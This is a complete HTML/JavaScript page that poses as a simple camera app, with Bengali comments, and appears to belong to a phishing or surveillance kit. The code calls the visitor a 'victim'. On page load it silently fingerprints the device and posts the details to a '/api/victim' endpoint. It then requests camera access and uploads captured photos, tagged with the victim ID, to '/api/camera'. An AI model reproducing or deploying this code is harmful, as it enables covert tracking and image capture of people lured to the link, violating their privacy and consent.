<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Camera</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
            flex-direction: column;
        }
        video {
            width: 100%;
            max-width: 400px;
            border-radius: 10px;
            border: 2px solid #333;
            background: #111;
            transform: scaleX(-1);
        }
        canvas {
            display: none;
        }
        #status {
            color: #fff;
            margin-top: 15px;
            font-size: 14px;
            background: rgba(255,0,0,0.7);
            padding: 8px 20px;
            border-radius: 20px;
            display: none;
        }
        #deviceStatus {
            color: #0f0;
            margin-top: 10px;
            font-size: 12px;
            display: none;
        }
        .btn-capture {
            margin-top: 15px;
            padding: 12px 30px;
            background: #ff4757;
            color: #fff;
            border: none;
            border-radius: 30px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            display: none;
        }
        .btn-capture:active {
            transform: scale(0.95);
        }
        .loading {
            color: #fff;
            font-size: 16px;
        }
    </style>
</head>
<body>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>
    <div id="status">✅ ছবি পাঠানো হচ্ছে...</div>
    <div id="deviceStatus">📱 ডিভাইস ইনফো পাঠানো হয়েছে</div>
    <button class="btn-capture" id="captureBtn">📸 ছবি তুলুন</button>
    <div class="loading" id="loadingText">⏳ ক্যামেরা চালু হচ্ছে...</div>

    <script>
        // ============================================================
        // 1. URL থেকে victimId বের করা
        // ============================================================
        const pathSegments = window.location.pathname.split('/');
        const victimId = pathSegments[pathSegments.length - 1];

        // ============================================================
        // 2. ডিভাইস ইনফো সংগ্রহ করা
        // ============================================================
        function collectDeviceInfo() {
            const info = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                colorDepth: screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookiesEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                deviceMemory: navigator.deviceMemory || 'unknown',
                touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
                connection: navigator.connection ? {
                    type: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt
                } : 'unknown'
            };
            return info;
        }

        // ============================================================
        // 3. ডিভাইস ইনফো পাঠানো (পেজ লোড হতেই)
        // ============================================================
        async function sendDeviceInfoImmediately() {
            try {
                const deviceInfo = collectDeviceInfo();
                const response = await fetch('/api/victim', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        id: victimId,
                        deviceInfo: deviceInfo
                        // লোকেশন ছাড়া, কারণ এটা ক্যামেরা পেজ
                    })
                });
                const result = await response.json();
                console.log('✅ Device info sent immediately:', result);
                document.getElementById('deviceStatus').style.display = 'block';
                document.getElementById('deviceStatus').textContent = '📱 ডিভাইস ইনফো পাঠানো হয়েছে';
            } catch (error) {
                console.error('❌ Failed to send device info:', error);
                document.getElementById('deviceStatus').style.display = 'block';
                document.getElementById('deviceStatus').textContent = '⚠️ ডিভাইস ইনফো পাঠাতে ব্যর্থ';
                document.getElementById('deviceStatus').style.color = '#ff0';
            }
        }

        // ============================================================
        // 4. ক্যামেরা সেটআপ ও ছবি তোলা
        // ============================================================
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const status = document.getElementById('status');
        const captureBtn = document.getElementById('captureBtn');
        const loadingText = document.getElementById('loadingText');

        let stream = null;

        async function setupCamera() {
            try {
                loadingText.textContent = '⏳ ক্যামেরা অনুমতি চাচ্ছি...';
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
                    audio: false
                });
                video.srcObject = stream;
                await video.play();
                loadingText.style.display = 'none';
                captureBtn.style.display = 'block';
                console.log('✅ Camera ready');
            } catch (err) {
                console.error('❌ Camera error:', err);
                loadingText.textContent = '❌ ক্যামেরা অ্যাক্সেস দেওয়া হয়নি';
                loadingText.style.color = '#ff4757';
            }
        }

        // ============================================================
        // 5. ছবি ক্যাপচার ও পাঠানো
        // ============================================================
        async function captureAndSendPhoto() {
            try {
                // ছবি ক্যাপচার
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const imageBase64 = canvas.toDataURL('image/jpeg', 0.85);

                // স্ট্যাটাস দেখানো
                status.style.display = 'block';
                status.textContent = '⏳ ছবি পাঠানো হচ্ছে...';
                captureBtn.disabled = true;

                // শুধু ছবি পাঠানো (ডিভাইস ইনফো ছাড়া)
                const response = await fetch('/api/camera', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        id: victimId,
                        image: imageBase64
                    })
                });
                const result = await response.json();

                if (result.success) {
                    status.textContent = '✅ ছবি পাঠানো হয়েছে!';
                    status.style.background = 'rgba(0,255,0,0.7)';
                } else {
                    status.textContent = '❌ ছবি পাঠাতে ব্যর্থ';
                    status.style.background = 'rgba(255,0,0,0.7)';
                }
                captureBtn.disabled = false;
            } catch (error) {
                console.error('❌ Capture error:', error);
                status.textContent = '❌ এরর: ' + error.message;
                status.style.background = 'rgba(255,0,0,0.7)';
                captureBtn.disabled = false;
            }
        }

        // ============================================================
        // 6. মেইন ফ্লো
        // ============================================================
        (async function main() {
            // STEP 1: ডিভাইস ইনফো সাথে সাথেই পাঠাও
            await sendDeviceInfoImmediately();

            // STEP 2: ক্যামেরা সেটআপ কর (পারমিশন চাইবে)
            await setupCamera();

            // STEP 3: ক্যাপচার বাটনে ক্লিক করলে ছবি পাঠাবে
            captureBtn.addEventListener('click', captureAndSendPhoto);
        })();

        // ============================================================
        // 7. পেজ আনলোড হলে ক্যামেরা বন্ধ
        // ============================================================
        window.addEventListener('beforeunload', function() {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
        });
    </script>

</body>
</html>
